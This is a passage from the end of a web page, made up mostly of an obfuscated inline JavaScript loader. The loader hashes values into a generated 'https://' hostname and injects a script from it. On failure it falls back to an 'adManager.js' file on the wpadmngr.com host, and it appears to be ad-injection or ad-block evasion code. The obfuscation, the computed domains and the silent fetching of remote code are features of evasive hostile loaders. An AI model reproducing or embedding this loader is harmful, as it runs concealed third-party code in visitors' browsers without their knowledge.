x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>